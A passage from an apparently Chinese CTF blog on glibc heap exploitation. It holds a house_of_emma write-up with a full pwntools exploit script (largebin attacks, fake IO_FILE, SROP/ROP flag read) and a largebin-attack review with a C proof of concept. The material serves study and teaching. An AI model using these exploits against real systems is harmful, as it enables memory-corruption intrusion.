流就发生了错误。</p><p>这种时候就可以考虑构造两个 IO_FILE，且后者指针处于前者的 _chains 处，前者用 GLIBC2.34 之前的 IO_FILE 攻击 的思想在 __pointer_chk_guard 处写已知内容，后者再用 House_OF_Emma 来进行函数指针调用。</p><h2 id="实战利用：House-of-emma"><a href="#实战利用：House-of-emma" class="headerlink" title="实战利用：House_of_emma"></a>实战利用：House_of_emma</h2><p><img src="/../../../../markdown/photos/t018e5175fbce4562c8.png" alt="img"></p><p>这道题是house_of_emma的模板题</p><p>表面看起来是一个vm，其实醉翁之意不在酒</p><p><img src="/../../../../markdown/photos/t013cd50f758c2212d8.png" alt="img"></p><p>add函数限制了size的大小</p><p><img src="/../../../../markdown/photos/t01d7479a2e93c90730.png" alt="img"></p><p>在delete函数中存在uaf</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>没有办法退出opcode的主循环，可以利用 <code>house_of_kiwi</code> 通过 <code>topchunk</code> 不够完成分配进行 <code>assert</code> 从而走io</p><ol><li>使用largebin attack在stderr处写入一个可控地址</li><li>使用largebin attack在 <code>__pointer_chk_guard</code> 处写入一个已知地址</li><li>通过写入的地址和需要调用的函数进行加密，同时构造合理的 <code>IO_FILE</code> </li><li>触发 <code>house_of_kiwi</code> 同时利用 <code>magic_gadget</code></li><li>进行orw</li></ol><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">global</span> all_payload</span><br><span class="line">    payload = p8(<span class="number">0x2</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, buf</span>):</span><br><span class="line">    <span class="keyword">global</span> all_payload</span><br><span class="line">    payload = p8(<span class="number">0x4</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    payload += p16(<span class="built_in">len</span>(buf))</span><br><span class="line">    payload += <span class="built_in">str</span>(buf)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_opcode</span>():</span><br><span class="line">    <span class="keyword">global</span> all_payload</span><br><span class="line">    all_payload += p8(<span class="number">5</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;Pls input the opcode&quot;</span>, all_payload)</span><br><span class="line">    all_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x410</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x430</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1f30b0</span>  <span class="comment"># main_arena + 1104</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">guard = libc_base + <span class="number">0x2035f0</span></span><br><span class="line">pop_rdi_addr = libc_base + <span class="number">0x2daa2</span></span><br><span class="line">pop_rsi_addr = libc_base + <span class="number">0x37c0a</span></span><br><span class="line">pop_rax_addr = libc_base + <span class="number">0x446c0</span></span><br><span class="line">syscall_addr = libc_base + <span class="number">0x883b6</span></span><br><span class="line">gadget_addr = libc_base + <span class="number">0x146020</span>  <span class="comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">setcontext_addr = libc_base + <span class="number">0x50bc0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heapbase</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run_opcode()</span><br><span class="line">sh.recvuntil(<span class="string">&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x2ae0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:\t&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack stderr</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base + <span class="number">0x1f30b0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0x2ae0</span>) + p64(libc.sym[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x22a0</span>) + p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x22a0</span>) * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x2ae0</span>) * <span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack guard</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x430</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base + <span class="number">0x1f30b0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0x2ae0</span>) + p64(guard - <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x450</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x22a0</span>) + p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x22a0</span>) * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x2ae0</span>) * <span class="number">3</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change top chunk size</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x438</span> + p64(<span class="number">0x300</span>))</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">srop_addr = heap_base + <span class="number">0x2ae0</span> + <span class="number">0x10</span></span><br><span class="line">fake_IO_FILE = <span class="number">2</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>] + <span class="number">0x40</span>)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE += p64(srop_addr)  <span class="comment"># rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + <span class="number">0x22a0</span>), <span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">fake_frame_addr = srop_addr</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = fake_frame_addr + <span class="number">0xF8</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rsp = fake_frame_addr + <span class="number">0xF8</span> + <span class="number">0x10</span></span><br><span class="line">frame.rip = pop_rdi_addr + <span class="number">1</span>  <span class="comment"># : ret</span></span><br><span class="line"></span><br><span class="line">rop_data = [</span><br><span class="line">    pop_rax_addr,  <span class="comment"># sys_open(&#x27;flag&#x27;, 0)</span></span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    syscall_addr,</span><br><span class="line"></span><br><span class="line">    pop_rax_addr,  <span class="comment"># sys_read(flag_fd, heap, 0x100)</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdi_addr,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    pop_rsi_addr,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>,</span><br><span class="line">    syscall_addr,</span><br><span class="line"></span><br><span class="line">    pop_rax_addr,  <span class="comment"># sys_write(1, heap, 0x100)</span></span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdi_addr,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rsi_addr,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>,</span><br><span class="line">    syscall_addr</span><br><span class="line">]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(fake_frame_addr) + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(setcontext_addr + <span class="number">61</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(frame).ljust(<span class="number">0xF8</span>, <span class="string">&#x27;\x00&#x27;</span>)[<span class="number">0x28</span>:] + <span class="string">&#x27;flag&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>) + flat(rop_data)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, fake_IO_FILE)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x450</span>)  <span class="comment"># House OF Kiwi</span></span><br><span class="line"><span class="comment"># gdb.attach(sh, &quot;b _IO_cookie_write&quot;)</span></span><br><span class="line">run_opcode()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> glibc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house_of_apple系列</title>
      <link href="/2023/11/11/house-of-apple%E7%B3%BB%E5%88%97/"/>
      <url>/2023/11/11/house-of-apple%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-apple系列-amp-amp-复习larginbin-attack"><a href="#House-of-apple系列-amp-amp-复习larginbin-attack" class="headerlink" title="House  of apple系列&amp;&amp;复习larginbin attack"></a>House  of apple系列&amp;&amp;复习larginbin attack</h1><h2 id="复习largebin-attack"><a href="#复习largebin-attack" class="headerlink" title="复习largebin_attack"></a>复习largebin_attack</h2><p>largebin和一般的chunk不同，结构为</p><table><thead><tr><th>prev_size</th><th>size</th></tr></thead><tbody><tr><td>fd</td><td>bk</td></tr><tr><td>fd_nextsize</td><td>bk_nextsize</td></tr><tr><td>content</td><td>content</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><p>可以看到，largebin比平常的chunk多了两个位，一个是fd_nextsize指向前一个比自己小的chunk，bk_nextsize指向后一个size比自己大的size</p><h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><p>原文 <a href="https://blog.csdn.net/qq_41453285/article/details/97627411">堆漏洞挖掘中的malloc_consolidate与FASTBIN_CONSOLIDATION_THRESHOLD-CSDN博客</a></p><p>这里关乎着碎片堆的整理，目前看起来有以下几种情况</p><ol><li>当申请一个堆块大于 <code>smallbin</code>的最小大小时，会触发 <code> malloc_consolidate()</code>  ，他会首先把 <code>fastbin</code> 中相邻的块 <em>(指物理地址相邻)</em> 进行合并，合并后放入 <code>unsortedbin</code> 中，随后，为了分配申请的chunk，会对 <code>unsortedbin</code> 进行遍历，然后将其归为到 <code>smallbin</code> 等链表中，使得 <code>fastbin</code> 清空</li><li><code>unsortedbin</code>  中有较大的 <code>freechunk</code> 够切割的情况下，切割这个 <code>chunk</code> ，多余的部分成为 <code>last_reminder</code> 仍然放在<code>unsortedbin</code> 中，其他的进行整理放到对应的 <code>chunk</code></li><li><code>malloc</code> 的时候发现没有可用的 <code>chunk</code> 并且去切割 <code>top_chunk</code> 的时候仍然不够分割，这时候就会对所有的 <code>chunk</code> 进行一次整理</li><li><strong>特别的</strong> 只有一和三会对 <code>fastbin</code> 进行整理，第二种情况并不会对其进行整理</li></ol><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin_attack"></a>largebin_attack</h2><p>原文： <a href="https://blog.csdn.net/qq_41202237/article/details/112825556">【精选】好好说话之Large Bin Attack_hollk的博客-CSDN博客</a></p><p>首先放出源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="built_in">unsorted_chunks</span> (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span> (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">set_inuse_bit_at_offset</span> (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    <span class="built_in">check_malloced_chunk</span> (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">chunk2mem</span> (victim);</span><br><span class="line">    <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">in_smallbin_range</span> (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = <span class="built_in">smallbin_index</span> (size);</span><br><span class="line">    bck = <span class="built_in">bin_at</span> (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = <span class="built_in">largebin_index</span> (size);</span><br><span class="line">    bck = <span class="built_in">bin_at</span> (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        <span class="built_in">assert</span> ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">assert</span> ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">              &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                <span class="built_in">assert</span> ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>放入 <code>largebin</code> 的逻辑在最后，经过上面的了解，我们不难知道，假设我们在 <code>largebin</code> 中已经放入了一个 <code>chunkA</code> 之后再放入一个比其稍大的 <code>chunkB</code> ，提前在b的 <code>bk</code> 和 <code>bk_next_size</code> 位置写入<code> addr1-0x10</code> , <code>addr2-0x20</code> 就可以在这两个地址写入b的地址，也就是可以通过 <strong>lagrbin_attack</strong> 强制完成一次任意地址写入一个堆地址</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">// gcc -g -no-pie hollk.c -o hollk</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"> 6 &#123;</span><br><span class="line"> <span class="number">7</span> </span><br><span class="line"> <span class="number">8</span>     <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line"> <span class="number">9</span>     <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line"><span class="number">12</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"><span class="number">13</span> </span><br><span class="line"><span class="number">14</span>     <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line"><span class="number">15</span>     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">16</span>     <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"><span class="number">17</span>     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">18</span>     <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"><span class="number">19</span>     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">20</span> </span><br><span class="line"><span class="number">21</span>     <span class="built_in">free</span>(p1);</span><br><span class="line"><span class="number">22</span>     <span class="built_in">free</span>(p2);</span><br><span class="line"><span class="number">23</span> </span><br><span class="line"><span class="number">24</span>     <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">25</span> <span class="comment">//触发`__malloc_cosilidate` p1进入largebin， p2一部分被切割 剩下的成为 `last_reminder` 留在unsortedbin</span></span><br><span class="line"><span class="number">26</span>     <span class="built_in">free</span>(p3);</span><br><span class="line"><span class="number">27</span> </span><br><span class="line"><span class="number">28</span>     p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line"><span class="number">29</span>     p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">30</span>     p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">31</span>     p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line"><span class="number">32</span>     p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"><span class="number">33</span> </span><br><span class="line"><span class="number">34</span>     <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">35</span> <span class="comment">// 再次触发 `__malloc-consilidate` p2进入largebin，之前在p2已经设置好bk和bk_nextsize 直接触发largebinattack </span></span><br><span class="line"><span class="number">36</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span 